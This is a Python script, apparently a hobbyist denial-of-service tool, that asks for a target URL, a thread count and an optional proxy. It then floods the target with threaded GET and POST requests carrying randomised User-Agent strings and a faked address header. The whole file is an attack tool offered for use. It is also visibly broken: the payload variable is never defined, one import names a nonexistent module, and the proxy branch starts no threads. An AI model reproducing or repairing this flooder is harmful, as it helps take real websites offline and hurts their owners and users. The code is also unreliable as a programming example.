#!/usr/bin/env python

import requests
from threading import Thread
from fake_useragent import UserAgent
from faker import Faker
import colorama 
from colorama import Fore
from datetime import datetime, timezone
import keyboard
from system import *
import optparse

date = datetime.fromtimestamp(1576280665, timezone.utc)

version = str(f"Version: 1.0.1, date:{date}")

baner = """

 ▄▄▄██▀▀▀█    ██  ███▄ ▄███▓ ▄▄▄▄    ▒█████     ▓█████▄ ▓█████▄  ▒█████    ██████ 
   ▒██   ██  ▓██▒▓██▒▀█▀ ██▒▓█████▄ ▒██▒  ██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
   ░██  ▓██  ▒██░▓██    ▓██░▒██▒ ▄██▒██░  ██▒   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
▓██▄██▓ ▓▓█  ░██░▒██    ▒██ ▒██░█▀  ▒██   ██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
 ▓███▒  ▒▒█████▓ ▒██▒   ░██▒░▓█  ▀█▓░ ████▓▒░   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▓▒▒░  ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░░▒▓███▀▒░ ▒░▒░▒░     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ▒ ░▒░  ░░▒░ ░ ░ ░  ░      ░▒░▒   ░   ░ ▒ ▒░     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░ ░   ░░░ ░ ░ ░      ░    ░    ░ ░ ░ ░ ▒      ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
 ░   ░     ░            ░    ░          ░ ░        ░       ░        ░ ░        ░  
                                  ░              ░       ░                        
                              by Squ1reX :}
"""

parser = optparse.OptionParser()

print(Fore.RESET + "\033c")
print(Fore.RED + baner + Fore.RESET)
print(Fore.MAGENTA, "Hi, bro. It`s http sites ddos(I'm not sure about https). To stop script, use the combination Ctrl+Alt+Delete" +  Fore.RESET)
print(Fore.GREEN + version + Fore.RESET)

(options, args) = parser.parse_args()

def on_key_event(e):
    if keyboard.is_pressed('ctrl+alt+delete'):  
        print("Скрипт остановлен")
        exit()

fake = Faker()

ip_addr = fake.ipv4()

class HeadersGenerator():
    def __init__(self):
        self.user_agent = UserAgent()

    def random_headers(self):
        user_agent = self.user_agent.random
        global headers
        headers = {
            'User-Agent': user_agent,
            'Remote address': ip_addr
        }
        return headers

def ddos():
    for i in range(thrnum):
        try:
            if proxy1 == 'Y':
                response = requests.get(url, headers=headers, data=payload, proxies={'http': proxy, 'https': proxy})
                response2 = requests.post(url, headers=headers, data=payload, proxies={'http': proxy, 'https': proxy})
            else:
                response = requests.get(url, headers=headers, data=payload)
                response2 = requests.post(url, headers=headers, data=payload)
        except (ConnectionError, SystemError, SyntaxError) as e:
            print(f"Error: {e}")

print('[1] - DDoS\n[2] - Выход')
user_input = input("Выберите опцию: ")

if user_input == '1':
    url = input('Url: ')
    thrnum = int(input('Threads: '))
    proxy1 = input(Fore.YELLOW + 'Do you want to use proxy?[Y/n]')

    if proxy1 == 'Y':
        proxy = input('Введите прокси: ')

    elif proxy1 == 'n':
        headers_generator = HeadersGenerator()
        headers = headers_generator.random_headers()
        payload = payload

        threads = [Thread(target=ddos) for _ in range(thrnum)]
        container = 1

        for thread in threads:
            container += 1
            print('DDoS...' + str(container))
            thread.start()
            print(f'DDoS attack is running with {thrnum} threads...')

elif user_input == '2':
    print('Выход...')
    exit()
else:
    print("Выберите опцию")



